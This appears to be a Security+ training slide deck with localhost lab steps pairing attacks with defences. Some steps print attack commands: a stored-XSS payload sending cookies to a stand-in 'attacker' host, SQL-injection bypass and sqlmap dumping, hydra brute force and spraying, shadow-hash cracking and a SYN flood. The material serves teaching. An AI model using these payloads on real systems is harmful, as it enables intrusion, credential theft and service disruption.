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39181-SecurityPlus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58400" y="658368"/>
            <a:ext cx="141732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73152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SY0-701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152144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700" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>COMPTIA SECURITY+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CompTIA Security+ Certification (SY0-701)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977639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TGS-2023039181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2 July 2026  ·  Trainer: Dr.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CompTIA Security+ / cybersecurity — defensive &amp; offensive security.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cybersecurity, cloud, networking &amp;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IT security, networking or Linux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be able to do — or which exam domain you want to master —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LMS / TMS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Access your course materials, attendance and assessment on the LMS/TMS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Portal: https://lms-tms.tertiaryinfotech.com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Download the slides and Learner Guide for reference during the open-book assessment.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3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3 &amp;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General Concepts &amp; Threats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1: General Security Concepts (Labs 1–5)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2: Threats &amp; Vulnerabilities (Labs 6–13)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Architecture &amp; Security Operations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3: Security Architecture (Labs 14–20)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4: Security Operations begins (Labs 21–26)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3 — Operations, Program Management &amp;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4: Security Operations (Labs 27–30)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5: Program Management (Labs 31–36)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 (WA + PP)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9:30am–6:30pm · 1-hour lunch · tea breaks within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General Concepts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Controls, CIA &amp; AAA, hashing, encryption and PKI.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Threats &amp; Vulns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Phishing, password &amp; web attacks, malware, scanning, hardening.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Architecture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Segmentation, firewalls, WAF, VPN, encryption, TLS, backup.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Operations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Hardening, MFA, SIEM, IDS, EDR, FIM, vuln mgmt, IR, SOAR.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LO5 · Program Mgmt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Risk &amp; CVSS, recon, pentesting, compliance, awareness.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6 questions,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5 hands-on security tasks,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Take the Assessment digital attendance (TRAQOM · SSG QR on the LMS)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— 6 questions, open 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PP — 5 hands-on tasks,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Fundamentals for the SY0-701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CompTIA Security+?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Vendor-neutral baseline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industry standard entry certification for cybersecurity roles.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SY0-701 domains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Five domains from general concepts to program management.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Hands-on and policy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Tests both technical skills and risk / governance knowledge.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security role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Assess posture, apply controls, monitor, respond and manage risk.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Five Exam Domains (SY0-701)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Concepts &amp; Threats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1. General Security Concepts — 12%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2. Threats, Vulns &amp; Mitigations — 22%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Build &amp; Operate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3. Security Architecture — 18%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4. Security Operations — 28%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5. Security Program Management &amp; Oversight — 20%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Passing score: 750 / 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Defence in depth: layer controls so no single failure is fatal.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Confidentiality, integrity and availability are the goals — every control in this course serves one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CIA Triad &amp; AAA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Confidentiality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Only authorised parties can read the data — encryption, access control.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Integrity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Data is not altered undetected — hashing, digital signatures.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Availability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Systems and data are there when needed — redundancy, backup, DoS defence.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AAA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Authentication proves who you are, authorization what you may do, accounting logs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Lab Workbench — Killercoda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Every hands-on lab runs in a free, disposable Ubuntu VM in your browser.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the playground: https://killercoda.com/playgrounds/scenario/ubuntu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 have a root shell with internet access — install tools with apt or a single binary.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Reset the playground between labs that change firewall, PAM or routing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36 LABS · FREE IN YOUR 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All 36 labs live in the course GitHub repository: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https://github.com/tertiarycourses/TGS-2023039181-SecurityPlus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80360"/>
            <a:ext cx="5074920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880360"/>
            <a:ext cx="50749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63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Option A — Clone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a terminal / Killercoda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git clone the repository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cd into labs/ and follow along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4983480"/>
            <a:ext cx="4526280" cy="457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029200"/>
            <a:ext cx="4297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$ git clone https://github.com/tertiarycourses/TGS-2023039181-SecurityPlus.git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880360"/>
            <a:ext cx="5074920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880360"/>
            <a:ext cx="50749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063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Option B — Download ZIP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On GitHub click the green Code button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Choose Download ZIP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Unzip and open the labs/ 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lab runs free in the browser on the Killercoda Ubuntu Playground — no local install required.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General Security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Security controls · CIA &amp; AAA · Hashing · Encryption · PKI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General Security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Security controls are grouped by CATEGORY (technical, managerial, operational, physical) and by TYPE (preventive, deterrent, detective, corrective, compensating, directive).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CIA triad — confidentiality, integrity, availability — is the goal; AAA (authentication, authorization, accounting) is how identities are governed.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Hashing proves integrity; salting defeats rainbow tables; digital signatures add authenticity and non-repudiation.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Symmetric encryption is fast for bulk data; asymmetric (public-key) solves key exchange; PKI and certificate authorities bind keys to identities.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General Security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Security Controls Categorization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CIA Triad and AAA on Linux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Hashing, Salting, and Digital Signatures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Symmetric vs. Asymmetric Encryption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5–5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PKI: Build Your Own Certificate Authority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maps real-world controls to categories and types, then implements a technical preventive control and a detective control on Linux.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control matrix plus a live iptables firewall block and auditd file-watch rule.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iptables, auditd, auditctl, ausearch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ten controls to a category and a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Block inbound Telnet with a preventive iptables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-A INPUT -p tcp --dport 23 -j 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the firewall rules to confirm the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-L INPUT -n --line-numbers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auditd and watch /etc/passwd for changes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auditd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detective watch rule and list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auditctl -w /etc/passwd -p wa -k passwd_changes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a change and confirm auditd detected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"# test" &gt;&gt; /etc/passwd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Search the audit log for the recorded event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ausearch -k passwd_changes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iptables rule appears in the INPUT chain and ausearch shows the logged /etc/passwd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enforces confidentiality, integrity, and availability, then walks through authentication, authorization, and accounting using built-in Linux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permission-protected secret file, a checksum integrity check, and a scoped sudo rule with an audit trail.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chmod, sha256sum, systemctl, ss, passwd, sudo, su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Protect a secret file so only its owner can read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600 /home/alice/secret.txt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another user is denied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-u bob cat /home/alice/secret.txt 2&gt;&amp;1 || echo DENIED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Baseline the file hash then detect tampering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sha256sum -c /tmp/secret.sha256 || echo "Integrity FAILED"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Restart sshd and confirm it is listening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restart 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alice's password to authenticate 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passwd alice &lt;&lt;EOF
Lab1234!
Lab1234!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Grant alice one scoped sudo command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"alice ALL=(ALL) NOPASSWD: /usr/bin/cat /var/log/auth.log" &gt;&gt; /etc/sudoers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authorization is limited then read the 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 - alice -c 'sudo cat /etc/shadow' 2&gt;&amp;1 | tail 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the accounting trail of sudo/su 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tail -20 /var/log/auth.log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Bob is denied the secret, the tampered checksum fails, alice can run only her one sudo command, and auth.log records every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produces deterministic hashes, adds salt, applies key stretching, and creates and verifies an RSA digital signature.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Salted hashes, a stretched password hash, and a verified RSA signature over a document.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sha256sum, openssl rand, openssl passwd, openssl genrsa, openssl dgst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Hash a password twice to show determinism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-n 'Pa$$w0rd' | sha256sum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random salt and hash the salted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SALT=$(openssl rand -hex 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Produce a key-stretched SHA-512 crypt hash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passwd -6 -salt $(openssl rand -hex 4) 'Pa$$w0rd'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an RSA key pair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genrsa -out priv.pem 2048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Export the matching public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rsa -in priv.pem -pubout -out pub.pem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Sign a document with the private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dgst -sha256 -sign priv.pem -out order.sig order.txt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signature with the public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dgst -sha256 -verify pub.pem -signature order.sig order.txt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Tamper the file and confirm verification fails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 - extra line" &gt;&gt; order.txt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signature returns Verified OK on the original file and Verification Failure after tampering.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encrypts a file with AES-256, then with GPG public-key crypto, and inspects the hybrid packet structure.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AES-encrypted file, a GPG key pair with a public/private encrypt-decrypt round trip, and a decoded hybrid packet dump.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openssl enc, gnupg, gpg, xxd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GnuPG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gnupg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Encrypt a message symmetrically with AES-256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enc -aes-256-cbc -pbkdf2 -salt -in msg.txt -out msg.aes -pass pass:Lab1234!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Decrypt it with the same passphrase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enc -d -aes-256-cbc -pbkdf2 -in msg.aes -pass pass:Lab1234!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GPG asymmetric key pair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gpg --batch --pinentry-mode loopback --passphrase '' --quick-generate-key 'Alice &lt;alice@lab.local&gt;' rsa2048 default 1y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Export Alice's shareable public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gpg --armor --export alice@lab.local &gt; alice.pub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Encrypt to Alice's public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gpg --yes --trust-model always -r alice@lab.local -e -o msg.gpg msg.txt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Decrypt with Alice's private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gpg --pinentry-mode loopback --passphrase '' -d msg.gpg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the hybrid packet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gpg --list-packets msg.gpg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AES decryption returns the plaintext and the GPG packet dump shows a pubkey-enc packet wrapping an AES-encrypted data packet.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stands up a private root CA, signs a server CSR, revokes the certificate, and publishes a CRL.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self-signed root CA, a CA-signed server certificate, and a CRL listing the revoked cert.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openssl genrsa, openssl req, openssl ca, openssl x509, openssl crl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CA directory layout and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~/ca/{certs,private,newcerts,crl}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the root key and self-signed root cert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req -x509 -new -key private/ca.key -days 3650 -sha256 -subj "/CN=Lab Root CA/O=Tertiary InfoTech" -out certs/ca.crt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server key and a CSR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req -new -key private/server.key -subj "/CN=web.lab.local/O=Lab" -out server.csr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the CA config and sign the CSR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ca -batch -config openssl.cnf -in server.csr -out certs/server.crt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issued cert's issuer and subject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x509 -in certs/server.crt -noout -issuer -subject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Revoke the server certificate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ca -config openssl.cnf -revoke certs/server.crt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and inspect the CRL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ca -config openssl.cnf -gencrl -out crl/lab.crl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Browse the system's trusted third-party root store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 /etc/ssl/certs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server cert shows issuer Lab Root CA, and the generated CRL lists server.crt as revoked.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General Security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Categorize and implement security controls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Demonstrate CIA and AAA with Linux tools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Hash, salt, and sign data with OpenSSL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Compare AES, GPG, and hybrid encryption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Run a CA lifecycle from CSR to CRL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Threats, Vulnerabilities &amp; Mitigations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Phishing · Passwords · Malware · Web attacks · Scanning · Hardening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Threats, Vulnerabilities &amp; Mitigations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Social engineering and phishing exploit people; SPF, DKIM and DMARC authenticate mail and expose spoofing.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Password attacks (spraying, brute force, offline cracking) are countered by length, hashing with salt, and lockout.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Web application flaws — SQL injection and cross-site scripting (XSS) — come from unvalidated input; mitigate with parameterisation and output encoding.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Find weaknesses before attackers do: vulnerability scanning, malware analysis and a hardening baseline reduce the attack surface.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Threats, Vulnerabilities &amp; Mitigations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6–8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Phishing Email Header Analysis (SPF / DKIM / DMARC)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Password Attacks: Spraying, Brute Force, Cracking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Malware Static Analysis (Safe Sample)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9–11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SQL Injection (SQLi)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Cross-Site Scripting (XSS)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DoS Simulation and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12–13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Vulnerability Scanning with Nikto and Nuclei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Linux Hardening Baseline with Lynis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dissects a spoofed email header and queries SPF, DKIM, and DMARC DNS records to prove the message did not come from the claimed sender.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header-analysis workflow that exposes SPF/DKIM/DMARC spoofing.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dnsutils, dig, swaks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Phishing Email Header Analysis (SP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DNS lookup and mail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dnsutils swaks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Phishing Email Header Analysis (SP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a known-bad phishing header to mail.eml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mail.eml &lt;&lt;'EOF'
...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Phishing Email Header Analysis (SP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SPF record for the claimed sender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+short TXT paypal.com | grep spf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Phishing Email Header Analysis (SP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Pull the DMARC policy record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+short TXT _dmarc.paypal.com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Phishing Email Header Analysis (SP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Pull the DKIM selector public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+short TXT s1024._domainkey.paypal.com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Phishing Email Header Analysis (SP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test message with swaks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swaks --to test@example.com --from spoof@paypal.com --server localhost --suppress-data --quit-after RCPT 2&gt;&amp;1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confirms spf=fail, dkim=none, dmarc=fail in the header and that the sending IP is absent from the real SPF record.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brute-forces a local SSH account with hydra, cracks the /etc/shadow hash with John the Ripper, and demonstrates password spraying.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hands-on attack chain covering brute force, offline cracking, and spraying with their log signatures.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hydra, john, openssh-server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attack tools and SSH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hydra john openssh-server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target user with a weak password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'victim:password123' | chpasswd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small wordlist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words.txt &lt;&lt;'EOF'
...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Brute force SSH with hydra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hydra -l victim -P words.txt -t 4 -f ssh://127.0.0.1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Detect the attack in the auth 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grep "Failed password" /var/log/auth.log 2&gt;/dev/null | tail || journalctl -u ssh --no-pager | grep "Failed password"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Crack the /etc/shadow hash with John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john --wordlist=words.txt target.hash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Demonstrate password spraying across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u in alice bob carol dave eve; do hydra -l "$u" -p "Winter2025!" -t 1 -f ssh://127.0.0.1;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hydra reports 'password123' as valid and John's --show reveals the cracked hash.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analyzes the harmless EICAR test file with file, strings, hashing, and a custom YARA rule the way a SOC analyst triages real malware.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static-analysis workflow producing an IoC hash and a reusable YARA detection.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file, binutils, coreutils, yara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YARA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yara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safe EICAR test sample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'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; sample.bin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the file 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file sample.bin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Compute the SHA-256 IoC hash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sha256sum sample.bin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Pull printable strings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strings sample.bin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YARA rule and scan the sample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yara eicar.yar sample.bin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Look up the known hash on threat feeds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yara -r eicar.yar /tmp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confirms the YARA rule matches sample.bin and that the SHA-256 is recognized across VirusTotal engines.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a deliberately vulnerable PHP/SQLite login, bypasses auth with manual and automated SQLi, then fixes it with parameterised queries.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vulnerable login app plus its prepared-statement patch.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sqlite3, php-cli, php-sqlite3, sqlmap, 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SQLite/PHP/sqlmap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sqlite3 php-cli php-sqlite3 sqlmap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vulnerable login page and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php -S 127.0.0.1:8080 -t .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normal login behaviour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"http://127.0.0.1:8080/login.php?u=admin&amp;p=s3cret"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Bypass auth with a manual injection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"http://127.0.0.1:8080/login.php?u=admin'--&amp;p=anything"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Automate exploitation with sqlmap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sqlmap -u "http://127.0.0.1:8080/login.php?u=admin&amp;p=x" --batch --dump -T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Patch with a parameterised query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login.php &lt;&lt;'EOF'
...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injection now fails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"http://127.0.0.1:8080/login.php?u=admin'--&amp;p=x"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the injected payload logs in before the patch and returns nothing after switching to bind parameters.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triggers reflected and stored XSS in tiny PHP pages, then defends with htmlspecialchars output encoding and a Content-Security-Policy header.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Vulnerable search/guestbook pages plus their encoding and CSP mitigations.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php-cli, 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PHP and set up the workspace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php-cli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vulnerable reflected-XSS page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php -S 127.0.0.1:8080 -t .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the reflected XSS payload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"http://127.0.0.1:8080/search.php?q=&lt;script&gt;alert(1)&lt;/script&gt;"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Store an XSS payload in a guestbook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"http://127.0.0.1:8080/guestbook.php?msg=&lt;script&gt;document.location='http://attacker/?c='+document.cookie&lt;/script&gt;"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Mitigate with output encoding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'htmlspecialchars($q, ENT_QUOTES, "UTF-8")'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strict Content-Security-Policy header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php -S 127.0.0.1:8080 router.php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CSP header is served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-sD - "http://127.0.0.1:8080/search.php?q=hi"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confirms the script reflects verbatim before the fix and appears as escaped &amp;lt;script&amp;gt; text with a CSP header after.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floods their own loopback with hping3, watches the connection table fill with half-open sockets, then mitigates using SYN cookies and iptables rate-limiting.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SYN-flood detection-and-mitigation exercise on a local nginx target.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hping3, nginx, iptables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attacker and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hping3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Baseline the open connections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 -s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Launch a loopback-only SYN flood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timeout 10 hping3 -S -p 80 --flood --rand-source 127.0.0.1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Log incoming SYNs with iptables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-A INPUT -p tcp --syn --dport 80 -j LOG --log-prefix "SYN: " --log-level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SYN cookies and rate-limit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sysctl -w net.ipv4.tcp_syncookies=1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Insert the rate-limit accept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-I INPUT -p tcp --syn --dport 80 -m limit --limit 25/s --limit-burst 50 -j ACCEPT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Re-run the flood and compare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timeout 10 hping3 -S -p 80 --flood --rand-source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the SYN-RECV count spikes during the flood and stays bounded after enabling SYN cookies plus rate-limiting.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scans a local Apache server with Nikto and Nuclei, ranks findings by CVSS, applies hardening headers, and re-scans to confirm the fixes.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prioritised, CVSS-ranked remediation queue with verified header fixes.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nikto, apache2, nuclei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Vulnerability Scanning with Nikto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scanner and target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nikto apache2 wget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Vulnerability Scanning with Nikto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Nikto against the local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nikto -h http://127.0.0.1 -o nikto.txt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Vulnerability Scanning with Nikto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Download and set up nuclei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wget -q https://github.com/projectdiscovery/nuclei/releases/download/v3.10.0/nuclei_3.10.0_linux_amd64.zip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Vulnerability Scanning with Nikto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with a severity filter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./nuclei -u http://127.0.0.1 -s low,medium,high,critical -o nuclei.txt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Vulnerability Scanning with Nikto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hardening headers to Apache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a2enmod headers &amp;&amp; a2enconf hardening &amp;&amp; systemctl reload apache2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Vulnerability Scanning with Nikto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Re-run Nikto to confirm the fixes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nikto -h http://127.0.0.1 | grep -E "X-Frame|HSTS|banner"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the missing-header findings disappear from the Nikto output after applying the hardening config.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audits an Ubuntu host with Lynis, applies SSH, sysctl, permission, and auto-update hardening, then re-audits to measure the improved hardening index.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before/after hardening score with CIS-aligned baseline fixes applied.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lynis, unattended-upgrades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Lynis and unattended-upgrades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lynis unattended-upgrades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initial audit and note the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lynis audit system --quick 2&gt;/dev/null | tee lynis-before.txt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Disable unused services and set permissions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disable --now avahi-daemon 2&gt;/dev/null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automatic security updates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dpkg-reconfigure -f noninteractive unattended-upgrades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Harden SSH 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's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config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kernel sysctl hardening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sysctl --system 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Re-audit and compare the hardening index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grep "Hardening index" lynis-before.txt lynis-after.txt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confirms the Lynis hardening index climbs 10-15 points between the before and after audits.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Threats, Vulnerabilities &amp; Mitigations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Analyze phishing email headers and validate anti-spoofing DNS records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Perform controlled brute force, cracking, and spraying against systems you own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Profile a benign test binary using core static-analysis primitives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Exploit and then patch a vulnerable PHP login page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Exploit reflected and stored XSS, then mitigate with encoding and CSP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Generate a controlled SYN flood, detect it, and rate-limit it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Scan a weak web server, prioritise findings by CVSS, and verify remediation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Audit, apply CIS-aligned fixes, and re-score a Linux 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Segmentation · Firewalls · WAF · VPN · Encryption at rest · TLS · Backup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Security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Defence in depth layers controls; network segmentation and firewalls limit lateral movement and enforce least privilege between zones.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web application firewall (WAF) filters HTTP attacks; a VPN protects data in transit across untrusted networks.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Protect data at rest with full-disk encryption (LUKS) and data in transit with hardened TLS ciphers and protocols.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Resilience is a security property: a tested 3-2-1 backup and recovery plan defeats ransomware and hardware failure.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Security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14–16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 Segmentation with Linux Namespaces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Stateful Firewall with UFW and nftables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Web Application Firewall with ModSecurity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17–19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Site-to-Site VPN with WireGuard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 at Rest: LUKS Full-Disk Encryption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TLS Hardening and Cipher Audit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20–20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Backup and Recovery with restic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DMZ, internal, and management zones as network namespaces and enforce a zone-to-zone policy with iptables.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Three isolated L3 zones behind a host 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ip netns, iproute2, veth, iptables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three zone namespaces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add dmz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veth pairs, move one end into each zone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link add veth-dmz type veth peer name veth-dmz-r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Assign IPs and enable IP forwarding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exec dmz ip addr add 10.0.10.2/24 dev veth-dmz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full reachability with no policy yet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exec dmz ping -c1 10.0.20.2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default-deny FORWARD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-P FORWARD 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explicit zone allow/deny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-A FORWARD -s 10.0.20.0/24 -d 10.0.10.0/24 -j ACCEPT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Re-test the enforced screened-subnet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exec dmz ping -c1 -W1 10.0.20.2 ||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DMZ-to-Internal pings fail while Internal-to-DMZ and Mgmt-to-DMZ succeed.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Compare the UFW and nftables front-ends over the same netfilter engine, build an allow-list ruleset, and read its packet counters.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default-deny host firewall with visible counters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ufw, nftables, nginx, netcat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firewall tools and a test web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ufw nftables nginx netcat-openbsd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UFW allow-list for SSH and HTTP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ufw allow 80/tcp comment 'HTTP from anywhere'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UFW and show numbered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ufw --force enable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an allowed port versus a denied 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nc -zv 127.0.0.1 23 2&gt;&amp;1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the underlying nftables ruleset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nft list ruleset | head -40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and load an nftables ruleset directly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enable --now nftables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Watch per-rule counters under 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nft list chain inet filter input | grep counter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Port 80 answers, port 23 is blocked, and rule counters increment under load.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Deploy Apache with ModSecurity and the OWASP Core Rule Set, then watch it block SQLi, XSS, traversal, and command-injection payloads.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Apache site protected by the OWASP CRS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apache2, libapache2-mod-security2, modsecurity-crs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Apache, ModSecurity, and the CRS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apache2 libapache2-mod-security2 modsecurity-crs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Turn the rule engine from DetectionOnly to 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's/^SecRuleEngine DetectionOnly/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf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Load the OWASP CRS and restart Apache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'Include /usr/share/modsecurity-crs/owasp-crs.load' &gt; /etc/modsecurity/owasp-crs.conf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module and rules are loaded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apachectl -M 2&gt;/dev/null | grep security2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Fire SQLi, XSS, traversal, and cmd payloads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-o /dev/null -w "%{http_code}\n" "http://127.0.0.1/?q=&lt;script&gt;alert(1)&lt;/script&gt;"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audit log for matched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tail -50 /var/log/modsec_audit.log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Tune a false positive and reload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reload apache2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attack payload returns HTTP 403 and is recorded in the audit log.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an encrypted WireGuard tunnel between two simulated sites running in separate Linux network namespaces.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two-endpoint WireGuard tunnel across namespaces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wireguard, wireguard-tools, ip netns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Site-to-Site VPN with WireGuard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WireGuard and load the kernel module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wireguard wireguard-tools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Site-to-Site VPN with WireGuard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key pair for each site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wg genkey | tee siteA.key | wg pubkey &gt; siteA.pub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Site-to-Site VPN with WireGuard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siteA/siteB namespaces with wg links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link add wgA type wireguard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Site-to-Site VPN with WireGuard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keys, listen ports, and allowed-ips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exec siteA wg set wgA private-key siteA.key listen-port 51820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Site-to-Site VPN with WireGuard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peer endpoints over host loopback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exec siteA wg set wgA peer "$(cat siteB.pub)" endpoint 127.0.0.1:51821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Site-to-Site VPN with WireGuard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tunnel with ping and wg show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exec siteA ping -c3 10.99.0.2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Ping succeeds and wg show reports a recent handshake with transferred bytes.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 LUKS2-encrypted volume on a loopback file, mount it, rotate its passphrase, and add a key-file slot.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encrypted volume with rotation and a keyfile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cryptsetup, losetup, mkfs.ext4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cryptsetup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cryptsetup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50MB image on a loop device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losetup -fP --show vault.img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Format the loop device with LUKS2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-n "Lab1234!" | cryptsetup luksFormat --type luks2 --cipher aes-xts-plain64 --key-size 512 --pbkdf argon2id "$LOOP"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it, make a filesystem, and mount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-n "Lab1234!" | cryptsetup luksOpen "$LOOP" vault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plaintext is absent from the raw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strings vault.img | grep -i "secret data"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Rotate the passphrase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-e "Lab1234!\nNewPass!9" | cryptsetup luksChangeKey "$LOOP"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key-file slot for unattended unlock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cryptsetup luksAddKey "$LOOP" /root/luks.key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secret string is unrecoverable from the raw image and both credentials unlock the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Audit a fresh nginx HTTPS site with testssl.sh, apply a hardened TLS configuration, and re-audit to confirm improvement.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hardened TLS 1.2/1.3 nginx site with HSTS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nginx, openssl, testssl.sh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TLS Hardening and Cipher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up a self-signed HTTPS nginx site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req -x509 -newkey rsa:2048 -nodes -days 30 -keyout /etc/ssl/private/lab.key -out /etc/ssl/certs/lab.crt -subj "/CN=lab.local"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TLS Hardening and Cipher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Clone testssl.sh and run a baseline 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./testssl.sh -p -P -s --color 0 https://localhost | tee ../baseline.txt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TLS Hardening and Cipher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hardened TLS snippet and include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'/listen 443/a include /etc/nginx/snippets/tls-hardening.conf;' /etc/nginx/sites-available/default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TLS Hardening and Cipher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Reload nginx and re-audit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nginx -t &amp;&amp; systemctl reload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TLS Hardening and Cipher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Cross-check downgrade resistance with openssl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s_client -connect localhost:443 -tls1_1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TLS 1.1 is rejected while TLS 1.3 negotiates a strong AEAD cipher and HSTS is present.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Configure encrypted, deduplicated restic backups, simulate ransomware, and perform a point-in-time restore.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encrypted restic repo with tested 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restic, python3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restic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restic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data and init an encrypted repo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restic -r /backup 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Take the first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restic -r /backup backup /data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Modify data and take a second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restic -r /backup backup /data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Simulate ransomware overwriting all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f in /data/*.txt; do echo "ENCRYPTED_BY_RANSOMWARE" &gt; "$f";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Restore from the pre-ransomware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restic -r /backup restore $SNAP --target /restore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restored files match the originals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diff -r /restore/data /data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pre-ransomware snapshot restores the original file contents intact.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Security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Segment networks with namespaces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Build allow-list firewalls and read counters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Deploy a layer-7 WAF with the OWASP CRS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Build an encrypted WireGuard tunnel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Encrypt data at rest with LUKS2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Audit and harden an HTTPS TLS config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Run encrypted backups and recover from ransomware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Hardening · IAM · MFA · SIEM · IDS · EDR · FIM · Vuln mgmt · IR · SOAR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Security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Operational security hardens access (SSH, PAM, sudo, MFA) and monitors continuously (SIEM, IDS, EDR, file-integrity monitoring).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SIEM centralises and correlates logs; an IDS inspects network traffic; EDR and osquery interrogate endpoints.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Vulnerability management is a continuous pipeline: discover, prioritise (CVSS), remediate and verify.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Incident response follows preparation → detection → containment → eradication → recovery → lessons learned, increasingly automated with SOAR playbooks.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Security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21–24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SSH Hardening + Fail2ban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IAM with PAM and sudo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Multi-Factor Authentication with TOTP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SIEM Basics with Wazuh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25–28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 IDS with Suricata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Endpoint Detection with osquery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File Integrity Monitoring with AIDE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Vulnerability Management with Trivy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29–30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Incident Response and Forensics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Automation and Orchestration (Mini-SOAR)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Switch SSH to key-based authentication and let Fail2ban ban repeated failed logins.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Key-only SSH server with an active brute-force jail.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openssh-server, fail2ban, ssh-keygen, iptables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Fail2ban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fail2ban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an ed25519 key pair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ssh-keygen -t ed25519 -f ~/.ssh/lab_ed25519 -N "" -C "lab-key"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Authorize the public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~/.ssh/lab_ed25519.pub &gt;&gt; ~/.ssh/authorized_keys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Harden sshd (key-only, no root password)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/etc/ssh/sshd_config.d/99-hardening.conf &lt;&lt;'EOF'
PermitRootLogin prohibit-password
PasswordAuthentication no
MaxAuthTries 3
EOF
systemctl restart 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an sshd jail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/etc/fail2ban/jail.d/sshd.local &lt;&lt;'EOF'
[sshd]
enabled = true
backend = systemd
maxretry = 3
bantime = 1h
EOF
systemctl restart fail2ban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a ban with failed logins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1 2 3 4 5; do ssh -o PubkeyAuthentication=no -o StrictHostKeyChecking=no baduser@127.0.0.1 2&gt;/dev/null;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the ban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fail2ban-client status sshd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Unban as admin override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fail2ban-client set sshd unbanip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fail2ban-client status sshd lists 127.0.0.1 as banned, and password login is rejected.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Map Linux groups to roles, restrict sudo per role, and enforce time and lockout policy via PAM.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Three RBAC roles with scoped sudo, pam_time and pam_faillock.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sudo, PAM, pam_time, pam_faillock, chage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role groups and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groupadd webops; useradd -m -G webops alice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Scope sudo per role in sudoers.d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/etc/sudoers.d/roles &lt;&lt;'EOF'
%webops ALL=(ALL) NOPASSWD: /bin/systemctl restart nginx
EOF
chmod 440 /etc/sudoers.d/roles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least privilege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 - alice -c 'sudo systemctl status nginx 2&gt;&amp;1 | head -2'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time-of-day restriction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'*;*;alice;Wd0900-1800' &gt;&gt; /etc/security/time.conf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pam_time in the login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grep -q pam_time /etc/pam.d/login || echo 'account required pam_time.so' &gt;&gt; /etc/pam.d/login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and enable pam_faillock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'/pam_unix.so/i auth required pam_faillock.so preauth silent' /etc/pam.d/common-auth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De-provision (offboard) a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usermod -L alice; chage -E 0 alice; passwd -S alice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alice can restart nginx but not run mysqldump, and faillock counts failed attempts.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Enrol a user with Google Authenticator's PAM module and enforce SSH key plus TOTP.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SSH requiring publickey and a TOTP one-time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libpam-google-authenticator, qrencode, oathtool, PAM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PAM module and helpers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libpam-google-authenticator qrencode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Enrol a user with a TOTP secret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-u mfauser google-authenticator -t -d -f -r 3 -R 30 -W -q -s /home/mfauser/.google_authenticator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Display the secret as a QR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qrencode -t ANSI "otpauth://totp/lab:mfauser?secret=$SECRET&amp;issuer=lab"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Wire the module into SSH PAM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'auth required pam_google_authenticator.so' &gt;&gt; /etc/pam.d/sshd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Require two factors in sshd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'AuthenticationMethods publickey,keyboard-interactive' &gt;&gt; /etc/ssh/sshd_config; systemctl restart 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code from the CLI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oathtool &amp;&amp; oathtool --totp -b "$SECRET"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Log in with key + code to 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SSH login succeeds only after both the key and a valid 6-digit TOTP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Install Wazuh all-in-one, register an agent, and pivot a brute-force alert to the attacker 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Single-node Wazuh manager, indexer, dashboard and local agent.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Wazuh manager/indexer/agent, curl, jq, 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Download and run the all-in-one installer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-sO https://packages.wazuh.com/4.9/wazuh-install.sh &amp;&amp; bash wazuh-install.sh -a -i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core services and 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status wazuh-manager --no-pager | head -5; ss -tlnp | grep -E '1514|55000|9200'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Register and install a local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/var/ossec/bin/manage_agents -a -n local -i 127.0.0.1 -q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agent package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WAZUH_MANAGER='127.0.0.1' dpkg -i wazuh-agent_4.9.0-1_amd64.deb; systemctl enable --now wazuh-agent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brute-force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$(seq 1 10); do ssh -o PubkeyAuthentication=no baduser@127.0.0.1 2&gt;/dev/null;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correlated alert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grep -E 'rule_id|level' /var/ossec/logs/alerts/alerts.log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Query alerts via the REST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TOKEN=$(curl -sk -u wazuh-wui:wazuh-wui -X POST https://localhost:55000/security/user/authenticate | jq -r .data.token)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Pivot to srcip in the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Rule 5712 (SSHD brute force) at level 10 appears and its srcip is the attacker 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Run Suricata in IDS mode with ET Open rules, trigger a known alert, then add a custom rule.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Suricata IDS logging alerts to eve.json with a custom rule.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suricata, suricata-update, jq, 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Suricata and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suricata jq &amp;&amp; suricata-update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the live interface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IFACE=$(ip route | awk '/default/ {print $5; exit}'); echo $IFACE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Suricata in IDS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suricata -i $IFACE -l /var/log/suricata --runmode workers -D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a known signature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--user-agent "test" "http://testmynids.org/uid/index.html"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alert from eve.json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jq -c 'select(.event_type=="alert") | {sig:.alert.signature, src:.src_ip}' /var/log/suricata/eve.json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and include a custom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/etc/suricata/rules/lab.rules &lt;&lt;'EOF'
alert http any any -&gt; any any (msg:"LAB curl UA"; http.user_agent; content:"curl/"; sid:9000002; rev:1;)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Reload rules and trigger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suricatasc -c reload-rules; curl -s "http://example.com/?id=1" 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eve.json shows the ET Open alert and the custom sid 9000002 firing on the curl request.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Install osquery, ask SQL questions of the live host, and schedule high-signal detections.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osquery interactive shell plus a scheduled osqueryd detection pack.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osquery, osqueryi, osqueryd, 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repo and install osquery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-fsSL https://pkg.osquery.io/deb/pubkey.gpg | gpg --dearmor -o /usr/share/keyrings/osquery.gpg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package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'deb [arch=amd64 signed-by=/usr/share/keyrings/osquery.gpg] https://pkg.osquery.io/deb deb main' &gt; /etc/apt/sources.list.d/osquery.list &amp;&amp; apt update &amp;&amp; apt install -y osquery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interactive SQL queries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osqueryi --json "SELECT * FROM listening_ports WHERE address = '0.0.0.0';"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Detect a fileless process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cp /bin/sleep /tmp/.evil; /tmp/.evil 600 &amp; rm /tmp/.evil; osqueryi --json "SELECT name, pid FROM processes WHERE on_disk = 0;"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Detect SUID binaries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osqueryi --json "SELECT path, mode FROM file WHERE path LIKE '/usr/bin/%' AND mode LIKE '%4%' LIMIT 10;"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Schedule queries with osqueryd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/etc/osquery/osquery.conf &lt;&lt;'EOF'
{ "schedule": { "fileless_proc": { "query": "SELECT name, pid FROM processes WHERE on_disk = 0;", "interval": 60 } } }
EOF
systemctl enable --now osqueryd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JSON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tail -3 /var/log/osquery/osqueryd.results.log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osqueryd writes JSON results and the on_disk=0 query surfaces the deleted-binary process.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Baseline critical files with AIDE, tamper one, and watch the integrity diff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AIDE baseline database with a daily integrity check.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aide, aideinit, cron, logger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aide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Define custom check groups and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/etc/aide/aide.conf.d/99_lab &lt;&lt;'EOF'
LAB_NORMAL = p+i+n+u+g+s+m+c+sha256
/etc/passwd LAB_NORMAL
